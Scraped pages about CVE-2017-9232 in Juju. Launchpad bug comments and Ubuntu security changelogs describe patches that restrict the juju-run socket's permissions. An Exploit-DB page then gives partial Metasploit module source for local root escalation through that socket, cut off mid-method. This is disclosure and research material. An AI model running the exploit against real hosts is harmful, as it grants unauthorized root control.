Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-25: |  |  | [#42](/juju/%2Bbug/1682411/comments/42) |
| --- | --- | --- | --- |

* [2.x using tempdir and proper chmod](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883203/%2Bfiles/2.x-juju-run.patch)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883203)
  (6.7 KiB,
  text/plain)

Final patch applied to 2.2 and dealing with a few bits of fallout in the test suite, etc. Had missed originally that we were doing an explicit chmod 777 as part of setting up the test, and that sockets don't cleanup on listener.Close() if you've renamed the socket in the mean time. Much thanks to Ian and Andrew for polishing the original idea.

Final patch applied to 2.2 and dealing with a few bits of fallout in the test suite, etc. Had missed originally that we were doing an explicit chmod 777 as part of setting up the test, and that sockets don't cleanup on listener.Close() if you've renamed the socket in the mean time. Much thanks to Ian and Andrew for polishing the original idea.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-25: |  |  | [#43](/juju/%2Bbug/1682411/comments/43) |
| --- | --- | --- | --- |

* [2.0.4/2.1.3 diff for using tempdir and chmod and dealing with test fallout](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883282/%2Bfiles/2.0.4-juju-run-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883282)
  (6.7 KiB,
  text/plain)

Turns out 2.0.4 had slightly different tweaks necessary vs develop.

Turns out 2.0.4 had slightly different tweaks necessary vs develop.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-25: |  |  | [#44](/juju/%2Bbug/1682411/comments/44) |
| --- | --- | --- | --- |

* [1.25 using tempdir, and sudo juju-run for 'juju run'](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883372/%2Bfiles/1.25-juju-run-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883372)
  (9.5 KiB,
  text/plain)

Changing perms on /var/lib/.../juju-run meant that in 1.25 it broke "juju run blah". Because 'juju run blah' is user initiated, and they would have permissions to do so via 'juju ssh' anyway, this added 'sudo' to how jujud executed 'juju run' requests.

This is the current rollup of all the changes we made to 1.25 in order to still operate. Note that 1.25 will probably need at least 1 more patch to make the test suite run reliably under Go 1.8 where a lot of the error strings, etc, have been changed. Andrew has a patch for that, but it probably doesn't need to be included in the debdiff, if the Ubuntu golang builders are not using Go 1.8.

Changing perms on /var/lib/.../juju-run meant that in 1.25 it broke "juju run blah". Because 'juju run blah' is user initiated, and they would have permissions to do so via 'juju ssh' anyway, this added 'sudo' to how jujud executed 'juju run' requests.
This is the current rollup of all the changes we made to 1.25 in order to still operate. Note that 1.25 will probably need at least 1 more patch to make the test suite run reliably under Go 1.8 where a lot of the error strings, etc, have been changed. Andrew has a patch for that, but it probably doesn't need to be included in the debdiff, if the Ubuntu golang builders are not using Go 1.8.

[Canonical Juju QA Bot (juju-qa-bot)](https://launchpad.net/~juju-qa-bot)
on 2017-05-25

| Changed in juju-core: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

[Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold)
on 2017-05-26

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-05-26: |  |  | [#45](/juju/%2Bbug/1682411/comments/45) |
| --- | --- | --- | --- |

This bug was fixed in the package juju-core - 2.0.2-0ubuntu2.1

---------------

juju-core (2.0.2-0ubuntu2.1) zesty-security; urgency=medium

\* SECURITY UPDATE: Privilege escalation via juju-run (LP: [#1682411](/bugs/1682411))

    - debian/patches/CVE-2017-9232.patch: create a unix domain socket with

      restricted permissions to limit juju-run to only similarly privileged

      processes.

    - CVE-2017-9232

-- Seth Arnold <email address hidden> Thu, 25 May 2017 17:32:58 -0700

This bug was fixed in the package juju-core - 2.0.2-0ubuntu2.1
---------------
juju-core (2.0.2-0ubuntu2.1) zesty-security; urgency=medium
\* SECURITY UPDATE: Privilege escalation via juju-run (LP: #1682411)
- debian/patches/CVE-2017-9232.patch: create a unix domain socket with
restricted permissions to limit juju-run to only similarly privileged
processes.
- CVE-2017-9232
-- Seth Arnold <seth.arnold@canonical.com> Thu, 25 May 2017 17:32:58 -0700

| Changed in juju-core (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-05-26: |  |  | [#46](/juju/%2Bbug/1682411/comments/46) |
| --- | --- | --- | --- |

This bug was fixed in the package juju-core - 2.0.2-0ubuntu0.16.10.2

---------------

juju-core (2.0.2-0ubuntu0.16.10.2) yakkety-security; urgency=medium

\* SECURITY UPDATE: Privilege escalation via juju-run (LP: [#1682411](/bugs/1682411))

    - debian/patches/CVE-2017-9232.patch: create a unix domain socket with

      restricted permissions to limit juju-run to only similarly privileged

      processes.

    - CVE-2017-9232

-- Seth Arnold <email address hidden> Thu, 25 May 2017 17:28:34 -0700

This bug was fixed in the package juju-core - 2.0.2-0ubuntu0.16.10.2
---------------
juju-core (2.0.2-0ubuntu0.16.10.2) yakkety-security; urgency=medium
\* SECURITY UPDATE: Privilege escalation via juju-run (LP: #1682411)
- debian/patches/CVE-2017-9232.patch: create a unix domain socket with
restricted permissions to limit juju-run to only similarly privileged
processes.
- CVE-2017-9232
-- Seth Arnold <seth.arnold@canonical.com> Thu, 25 May 2017 17:28:34 -0700

| Changed in juju-core (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-05-26: |  |  | [#47](/juju/%2Bbug/1682411/comments/47) |
| --- | --- | --- | --- |

This bug was fixed in the package juju-core - 1.25.6-0ubuntu1.14.04.2

---------------

juju-core (1.25.6-0ubuntu1.14.04.2) trusty-security; urgency=medium

\* SECURITY UPDATE: Privilege escalation via juju-run (LP: [#1682411](/bugs/1682411))

    - debian/patches/CVE-2017-9232.patch: create a unix domain socket with

      restricted permissions to limit juju-run to only similarly privileged

      processes.

    - CVE-2017-9232

-- Seth Arnold <email address hidden> Thu, 25 May 2017 16:37:56 -0700

This bug was fixed in the package juju-core - 1.25.6-0ubuntu1.14.04.2
---------------
juju-core (1.25.6-0ubuntu1.14.04.2) trusty-security; urgency=medium
\* SECURITY UPDATE: Privilege escalation via juju-run (LP: #1682411)
- debian/patches/CVE-2017-9232.patch: create a unix domain socket with
restricted permissions to limit juju-run to only similarly privileged
processes.
- CVE-2017-9232
-- Seth Arnold <seth.arnold@canonical.com> Thu, 25 May 2017 16:37:56 -0700

| Changed in juju-core (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Ubuntu Foundations Team Bug Bot (crichton)](https://launchpad.net/~crichton) wrote on 2017-05-26: |  |  | [#48](/juju/%2Bbug/1682411/comments/48) |
| --- | --- | --- | --- |

The attachment "chmod after creating the socket" seems to be a patch. If it isn't, please remove the "patch" flag from the attachment, remove the "patch" tag, and if you are a member of the ~ubuntu-reviewers, unsubscribe the team.

[This is an automated message performed by a Launchpad user owned by ~brian-murray, for any issues please contact him.]

The attachment "chmod after creating the socket" seems to be a patch. If it isn't, please remove the "patch" flag from the attachment, remove the "patch" tag, and if you are a member of the ~ubuntu-reviewers, unsubscribe the team.
[This is an automated message performed by a Launchpad user owned by ~brian-murray, for any issues please contact him.]

| **tags**: | added: patch |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-06-02: |  |  | [#49](/juju/%2Bbug/1682411/comments/49) |
| --- | --- | --- | --- |

This bug was fixed in the package juju-core-1 - 1.25.6-0ubuntu2.16.10.2

---------------

juju-core-1 (1.25.6-0ubuntu2.16.10.2) yakkety-security; urgency=medium

\* SECURITY UPDATE: Privilege escalation via juju-run (LP: [#1682411](/bugs/1682411))

    - debian/patches/CVE-2017-9232.patch: create a unix domain socket with

      restricted permissions to limit juju-run to only similarly privileged

      processes.

    - CVE-2017-9232

-- Seth Arnold <email address hidden> Fri, 26 May 2017 15:30:40 -0700

This bug was fixed in the package juju-core-1 - 1.25.6-0ubuntu2.16.10.2
---------------
juju-core-1 (1.25.6-0ubuntu2.16.10.2) yakkety-security; urgency=medium
\* SECURITY UPDATE: Privilege escalation via juju-run (LP: #1682411)
- debian/patches/CVE-2017-9232.patch: create a unix domain socket with
restricted permissions to limit juju-run to only similarly privileged
processes.
- CVE-2017-9232
-- Seth Arnold <seth.arnold@canonical.com> Fri, 26 May 2017 15:30:40 -0700

| Changed in juju-core-1 (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-06-02: |  |  | [#50](/juju/%2Bbug/1682411/comments/50) |
| --- | --- | --- | --- |

This bug was fixed in the package juju-core-1 - 1.25.6-0ubuntu1.16.04.2

---------------

juju-core-1 (1.25.6-0ubuntu1.16.04.2) xenial-security; urgency=medium

\* SECURITY UPDATE: Privilege escalation via juju-run (LP: [#1682411](/bugs/1682411))

    - debian/patches/CVE-2017-9232.patch: create a unix domain socket with

      restricted permissions to limit juju-run to only similarly privileged

      processes.

    - CVE-2017-9232

-- Seth Arnold <email address hidden> Fri, 26 May 2017 15:29:18 -0700

This bug was fixed in the package juju-core-1 - 1.25.6-0ubuntu1.16.04.2
---------------
juju-core-1 (1.25.6-0ubuntu1.16.04.2) xenial-security; urgency=medium
\* SECURITY UPDATE: Privilege escalation via juju-run (LP: #1682411)
- debian/patches/CVE-2017-9232.patch: create a unix domain socket with
restricted permissions to limit juju-run to only similarly privileged
processes.
- CVE-2017-9232
-- Seth Arnold <seth.arnold@canonical.com> Fri, 26 May 2017 15:29:18 -0700

| Changed in juju-core-1 (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-06-03: |  |  | [#51](/juju/%2Bbug/1682411/comments/51) |
| --- | --- | --- | --- |

Thanks to everyone.

Thanks to everyone.

[Canonical Juju QA Bot (juju-qa-bot)](https://launchpad.net/~juju-qa-bot)
on 2017-06-29

| Changed in juju: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

[See full activity log](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/juju/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/juju/%2Bbug/1682411/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [chmod after creating the socket](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872349/%2Bfiles/run.patch)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872349 "Change patch details")
* [set umask before creating socket 1.25](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872377/%2Bfiles/umask-2.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872377 "Change patch details")
* [set umask before creating socket 2.x](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872378/%2Bfiles/umask-2.x.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872378 "Change patch details")
* [1.25 use tempdir and chmod for socket creation](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4878041/%2Bfiles/juju-run-1.25-tempdir.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4878041 "Change patch details")
* [2.x use tempdir and chmod for socket creation](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4878042/%2Bfiles/juju-run-2.x-tempdir.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4878042 "Change patch details")
* [1.25 include controller\_version when checking for charm updates](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4882073/%2Bfiles/1.25-report-version-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4882073 "Change patch details")
* [2.x using tempdir and proper chmod](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883203/%2Bfiles/2.x-juju-run.patch)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883203 "Change patch details")
* [2.0.4/2.1.3 diff for using tempdir and chmod and dealing with test fallout](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883282/%2Bfiles/2.0.4-juju-run-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883282 "Change patch details")
* [1.25 using tempdir, and sudo juju-run for 'juju run'](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4883372/%2Bfiles/1.25-juju-run-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4883372 "Change patch details")

* [Add patch](/juju/%2Bbug/1682411/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_504f73d9_20250126_051100.html ===

[Log in / Register](https://launchpad.net/%2Blogin)

![Launchpad logo and name](/@@/launchpad-logo-and-name.svg)

---

Search

Search

**47,168** projects,
**2,043,835** bugs,
**1,009,617** branches,
**86,958** Git repositories,
**3,149,475** translations,
**817,744** answers,
**76,153** blueprints,
and counting...

## Launchpad

#### A software collaboration platform that provides

#### [Bug tracking](https://bugs.launchpad.net/)

One place to track bugs across project boundaries and tools

#### [Code hosting](https://code.launchpad.net/) using [Git](https://git-scm.com/) and [Bazaar](http://bazaar.canonical.com/)

Easy for anyone to get your project's code using Git or Bazaar

#### [Code reviews](https://help.launchpad.net/Code/Review)

Full control of who can land code in your project remains with you

#### [Ubuntu package building and hosting](https://launchpad.net/ubuntu)

Publishing your software is simple with Personal Package Archives

#### [Crowd source translations](https://translations.launchpad.net/)

Build an open community to translate your software into almost any language

#### [Mailing lists](https://help.launchpad.net/Teams/MailingLists)

Find and work with the right people by building a social network of individuals and teams around projects

#### [Answer tracking and FAQs](https://answers.launchpad.net/)

Free software thrives on people helping each other when the unexpected happens

#### [Specification tracking](https://blueprints.launchpad.net/)

Track ideas and chunks of work as “blueprints”

## Get started

Learn more about Launchpad in the
[user guide](https://help.launchpad.net/).

If you're ready, you can:

* ![add](/@@/add-homepage.png)
  #### [Create an account](/%2Blogin)
* ![tour](/@@/tour-homepage.png)
  #### [Take the tour](/%2Btour)
* ![question](/@@/question-homepage.png)
  #### [Find answers](https://answers.launchpad.net/)

## Featured projects

* ![Beautiful Soup](/@@/product-logo)
  #### [Beautiful Soup](/beautifulsoup)

  A program designed for screen-scraping HTML. The discussion group is at: http://groups.google.com...
* ![Breezy](/@@/product-logo)
  #### [Breezy](/brz)

  Breezy is a friendly powerful distributed version control system.
* ![Inkscape](https://launchpadlibrarian.net/66795469/ink-lp-logo.png)
  #### [Inkscape](/inkscape)

  Inkscape is an SVG-based graphics editor featuring alpha
  blending, node editing, SVG to PNG exp...
* ![Launchpad itself](https://launchpadlibrarian.net/600817174/Canonical_Launchpad_icon_64px.png)
  #### [Launchpad itself](/launchpad)

  Launchpad is a set of Web services to help software developers collaborate.
* ![OpenMW](/@@/product-logo)
  #### [OpenMW](/openmw)

  OpenMW is an attempt to reimplement the popular role playing game Morrowind. It aims to be a full...
* ![OpenShot Video Editor](https://launchpadlibrarian.net/250357498/OpenShot-2-Logo.png)
  #### [OpenShot Video Editor](/openshot)

  OpenShot Video Editor is a free, open-source, non-linear video editor. It can create and edit vid...
* ![OpenStack](https://launchpadlibrarian.net/52042558/os64.png)
  #### [OpenStack](/openstack)

  The OpenStack Open Source Cloud Mission: to produce the ubiquitous Open Source Cloud Computing pl...
* ![txpkgupload](/@@/product-logo)
  #### [txpkgupload](/txpkgupload)

  Package upload server used by Launchpad.
* ![Ubuntu](https://launchpadlibrarian.net/606381979/CoF%2064px.png)
  #### [Ubuntu](/ubuntu)

  Ubuntu is a complete Linux-based operating system, freely available with both community and profe...

* **[Browse all
  47168
  projects](/projects)!**

## Recent Launchpad blog posts

[Read the blog](http://blog.launchpad.net)

* [Introducing Launchpad Bug Templates](https://blog.launchpad.net/general/introducing-launchpad-bug-templates)
  – 03 Dec 2024

  The new feature bug templates in Launchpad aims to streamline the bug reporting process, making it more efficient for both users and project maintainers. In the past, Launchpad provided only a basic description field for filling bug reports. This often led to incomplete or vague submissions, as users may not include essential details or steps […]
* [Launchpad’s new homepage](https://blog.launchpad.net/general/launchpads-new-homepage)
  – 01 Mar 2024

  Launchpad’s new homepage Launchpad has been around for a while, and its frontpage has remained untouched for a few years now. If you go into launchpad.net, you’ll notice it looks quite different from what it has looked like for the past 10 years – it has been updated! The goal was to modernize it while […]
* [Launchpad-linked federated Matrix accounts](https://blog.launchpad.net/general/launchpad-verified-federated-matrix-accounts)
  – 22 Jan 2024

  Users can now add their Matrix accounts to their profile in Launchpad, as requested by Canonical’s Community team. We also took the chance to slightly rework the frontend and how we display social accounts in the user profiles. Instead of having different sections in the profile for each social account , all social accounts are […]
* [Self-service riscv64 builds](https://blog.launchpad.net/ppa/self-service-riscv64-builds)
  – 22 Nov 2023

  Launchpad has supported building for riscv64 for a while, since it was a requirement to get Ubuntu’s riscv64 port going. We don’t actually have riscv64 hardware in our datacentre, since we’d need server-class hardware with the hypervisor extension and that’s still in its infancy; instead, we do full-system emulation of riscv64 on beefy amd64 hardware […]
* [Introducing Project-Scoped Access Tokens](https://blog.launchpad.net/general/introducing-project-scoped-access-tokens)
  – 20 Nov 2023

  Access tokens can be used to access repositories on behalf of someone. They have scope limitations, optional expiry dates, and can be revoked at any time. They are a stricter and safer alternative to using real user authentication when needing to automate pushing and/or pulling from your git repositories. This is a concept that has […]
* [New domain names for PPAs](https://blog.launchpad.net/ppa/new-domain-names-for-ppas)
  – 16 Feb 2022

  Since they were introduced in 2007, Launchpad’s Personal Package Archives (PPAs) have always been hosted on ppa.launchpad.net. This has generally worked well, but one significant snag became clear later on: it was difficult to add HTTPS support for PPAs due to the way that cookies work on the web. Launchpad uses a cookie for your […]

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_b9cc74f0_20250126_051100.html ===

[Log in / Register](https://launchpad.net/~jameinel/%2Blogin)

[![](https://launchpadlibrarian.net/10287003/John64x64.jpg)](https://launchpad.net/~jameinel)

## [John A Meinel](https://launchpad.net/~jameinel)

* Overview
* [Code](https://code.launchpad.net/~jameinel)
* [Bugs](https://bugs.launchpad.net/~jameinel)
* [Blueprints](https://blueprints.launchpad.net/~jameinel)
* [Translations](https://translations.launchpad.net/~jameinel)
* [Answers](https://answers.launchpad.net/~jameinel)

* [Related packages](https://launchpad.net/~jameinel/%2Brelated-packages)
* [Related projects](https://launchpad.net/~jameinel/%2Brelated-projects)

## User information

Launchpad Id:
jameinel

Email:
[Log in](%2Blogin) for email information.

Member since:
2005-06-15

[![Icon of (DEPRECATED) Ubuntu Chicago LoCo Team](https://launchpadlibrarian.net/3300871/chigotchi.png "Member of (DEPRECATED) Ubuntu Chicago LoCo Team")](/~ubuntu-chicago)
[![Icon of Launchpad Beta Testers](https://launchpadlibrarian.net/600856498/Canonical_Launchpad_icon_14px.png "Member of Launchpad Beta Testers")](/~launchpad-beta-testers)
[![Icon of Launchpad Development mailing list](https://launchpadlibrarian.net/600856571/Canonical_Launchpad_icon_14px.png "Member of Launchpad Development mailing list")](/~launchpad-dev)
[![Icon of Olive Team](https://launchpadlibrarian.net/3007474/oliveicon2.gif "Member of Olive Team")](/~olive-team)
[![Icon of OpenStack Team](https://launchpadlibrarian.net/52313052/os14.png "Member of OpenStack Team")](/~openstack)
[![Icon of Ubuntu Chumby Hackers](https://launchpadlibrarian.net/27381132/14.jpg "Member of Ubuntu Chumby Hackers")](/~ubuntu-chumby-hackers)
[![Icon of Ubuntu Illinois LoCo Team](https://launchpadlibrarian.net/6591121/illinois.png "Member of Ubuntu Illinois LoCo Team")](/~ubuntu-illinois)
[![Icon of Ubuntu Local Community Teams](https://launchpadlibrarian.net/162222905/locoteams-icon.png "Member of Ubuntu Local Community Teams")](/~locoteams)
[![Icon of Wikkid Developer List](https://launchpadlibrarian.net/48681018/wikkid-14.png "Member of Wikkid Developer List")](/~wikkid-dev)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English

OpenPGP keys:

3D580731EAA44D236EBF2E1D4ECF4E8E3884F48C

SSH keys:

[jameinel@FALCO](%2Bsshkeys)

[jam@saw](%2Bsshkeys)

[jameinel@Link](%2Bsshkeys)

[canonical](%2Bsshkeys)

[jameinel-git-signing-key](%2Bsshkeys)

Time zone:

US/Eastern
(UTC-0500)

Karma:
[92](https://launchpad.net/~jameinel/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**jam**
 on
**irc.freenode.net**

![IRC](/@@/social-irc "IRC")
**jameinel**
 on
**irc.libera.chat**

## [All bugs in progress](https://launchpad.net/~jameinel/%2Bassignedbugs?search=Search&field.status=In+Progress) Assigned bugs

||  | #1046697 [missing integration tests of lightweight checkout and remote repository](https://bugs.launchpad.net/bzr/%2Bbug/1046697) |  |
| --- | --- | --- |
| in [Bazaar](/bzr) | | |

| --- | --- | --- | --- | --- | --- |
||  | #1046284 [TooManyConcurrentRequests when committing to lightweight checkout](https://bugs.launchpad.net/bzr/%2Bbug/1046284) |  |
| --- | --- | --- |
| in [Bazaar](/bzr) | | |

||  | #1010339 [testament in binary](https://bugs.launchpad.net/bzr/%2Bbug/1010339) |  |
| --- | --- | --- |
| in [Bazaar](/bzr) | | |

||  | #819604 [when an idle ssh transport is interrupted, bzrlib errors; should reconnect instead](https://bugs.launchpad.net/bzr/2.3/%2Bbug/819604) |  |
| --- | --- | --- |
| in [Bazaar](/bzr) | | |

||  | #819604 [when an idle ssh transport is interrupted, bzrlib errors; should reconnect instead](https://bugs.launchpad.net/bzr/2.2/%2Bbug/819604) |  |
| --- | --- | --- |
| in [Bazaar](/bzr) | | |

## [All assigned blueprints](/~jameinel/%2Bspecs?role=assignee) Assigned blueprints

| **[Repository performance improvements](https://blueprints.launchpad.net/bzr/%2Bspec/repository-performance "repository-performance")** for **Bazaar**  Commit seems to be relatively slow. It should be possible to optimise its performance significantly, though that may involved optimising other parts of the code base - analysis is needed to determine what can be optimised further, or whether there are immediately available areas that are optimisable without deep sto... | |
| --- | --- |
| **[Submit changes by mail](https://blueprints.launchpad.net/bzr/%2Bspec/submitbymail "submitbymail")** for **Bazaar**  We'd like to submit changesets and/or merge requests by gpg-signed mail. This should combine the best of pqm, darcs, and other systems. | |

## Personal package archives

| [MaaS packages for jam](/~jameinel/%2Barchive/ubuntu/maas-experimental) |
| --- |
| [PPA for John A Meinel](/~jameinel/%2Barchive/ubuntu/ppa) |

* [View source package recipes](https://code.launchpad.net/~jameinel/%2Brecipes)

## Latest memberships

John A Meinel is not an
active member of any Launchpad teams.

## [Recent activities](https://launchpad.net/~jameinel/%2Bkarma) Most active in

| [Canonical Juju](/juju) |  |
| --- | --- |
| [charmcraft](/charmcraft) |  |
| [Snap Store Server](/snapstore-server) |  |
| [juju-core](/juju-core) |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from www.exploit-db.com_0f7f0c39_20250125_015413.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Juju-run Agent - Privilege Escalation (Metasploit)

#### EDB-ID:

###### 44023

#### CVE:

###### [2017-9232](https://nvd.nist.gov/vuln/detail/CVE-2017-9232)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2018-02-12

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Juju-run Agent Privilege Escalation',
      'Description'    => %q{
        This module attempts to gain root privileges on Juju agent systems
        running the juju-run agent utility.

        Juju agent systems running agent tools prior to version 1.25.12,
        2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket
        to manage software ("units") without setting appropriate permissions,
        allowing unprivileged local users to execute arbitrary commands as root.

        This module has been tested successfully with Juju agent tools versions
        1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju
        1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ryan Beisner', # Discovery and PoC
          'David Ames (@thedac)', # Discovery and PoC
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
        ],
      'DisclosureDate' => 'Apr 13 2017',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        => [[ 'Auto', {} ]],
      'References'     =>
        [
          [ 'CVE', '2017-9232' ],
          [ 'BID', '98737' ],
          [ 'URL', 'https://bugs.launchpad.net/juju/+bug/1682411' ]
        ]
    ))
    register_options(
      [
        OptString.new('UNIT', [ false, 'A valid Juju unit name', '' ]),
        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
      ])
  end

  def check
    juju_run_path = cmd_exec 'which juju-run'

    if juju_run_path.start_with? '/'
      vprint_good 'juju-run is installed'
      return CheckCode::Detected
    end

    vprint_error 'juju-run is NOT installed'

    CheckCode::Safe
  end

  def unit_names
    units = []

    cmd_exec('/bin/ls -m /var/log/juju/*.log').chomp.split(/,\s*/).each do |log|
      units << ::File.basename(log).gsub(/\.log$/, '')
    end

    cmd_exec('/bin/ls -m /var/lib/juju/agents/').chomp.split(/,\s*/).each do |agent|
      units << ::File.basename(agent)
    end

    units.uniq
  end

  def execute_command(cmd, opts = {})
    cmd_exec "juju-run #{opts['unit']} '#{cmd}'"
  end

  def upload_and_chmodx(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x '#{path}'"
    register_file_for_cleanup path
  end

  def exploit
    if check != CheckCode::Detected
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    units = datastore['UNIT'].blank? ? unit_names : [ datastore['UNIT'] ]

    if units.empty?
      fail_with Failure::Unknown, "Could not find any Juju units. Try specifying a 'UNIT'"
    end

    # Check each unit for a privileged socket
    print_status "Trying #{units.size} units..."

    socket_unit = nil
    unit_names.each do |unit|
      id = execute_command 'id', 'unit' => unit

      if id.include? 'root'
        print_good "Unit #{unit.inspect} uses a privileged socket"
        socket_unit = unit
        break
      end
    end

    if socket_unit.nil?
